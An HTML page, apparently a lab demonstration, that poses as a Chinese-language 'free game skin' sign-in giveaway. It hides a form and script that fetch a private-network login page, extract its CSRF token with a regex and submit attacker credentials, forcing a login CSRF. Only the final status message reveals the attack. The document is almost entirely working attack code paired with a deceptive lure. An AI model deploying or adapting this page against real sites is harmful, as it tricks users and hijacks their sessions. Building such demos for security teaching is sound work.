<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>🎮 每日签到 - 免费领皮肤！</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 80px; background: #1a1a2e; color: #fff; }
        .card { background: #16213e; max-width: 400px; margin: 0 auto; padding: 40px; border-radius: 16px; }
        .btn { background: #e94560; padding: 12px 30px; border: none; border-radius: 8px; color: white; font-size: 18px; cursor: pointer; }
        .hidden-form { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎮 游戏礼包签到</h1>
        <p>点击下方按钮，每日免费领取限定皮肤！</p>
        <button class="btn" onclick="attack()">🎁 立即领取</button>
        <p id="status" style="margin-top:20px;color:#888;font-size:14px;"></p>
    </div>

    <!-- ⚠️ 恶意隐藏表单 —— 你根本看不见这个 -->
    <form class="hidden-form" id="csrf_form" method="POST" action="http://192.168.141.129:5000/login">
        <input type="text" name="csrf_token" value="">
        <input type="text" name="username" value="hacker">
        <input type="password" name="password" value="hacked2025">
    </form>

    <script>
        function attack() {
            document.getElementById('status').innerText = '⏳ 领取中，请稍候...';

            // 先访问登录页，偷 CSRF Token
            fetch('http://192.168.141.129:5000/login', {credentials: 'include'})
                .then(r => r.text())
                .then(html => {
                    // 从HTML中提取csrf_token
                    let m = html.match(/value="([a-f0-9]{32})"/);
                    let token = m ? m[1] : '';

                    // 构造并提交恶意登录请求
                    let form = document.getElementById('csrf_form');
                    form.querySelector('[name="csrf_token"]').value = token;

                    let fd = new FormData(form);
                    return fetch('http://192.168.141.129:5000/login', {
                        method: 'POST',
                        body: new URLSearchParams(fd),
                        credentials: 'include'
                    });
                })
                .then(() => {
                    document.getElementById('status').innerHTML = '✅ 领取成功！<br><br>⚠️ 但你的登录会话已被替换为 hacker 账号！<br>这就是 CSRF 攻击！';
                });
        }
    </script>
</body>
</html>
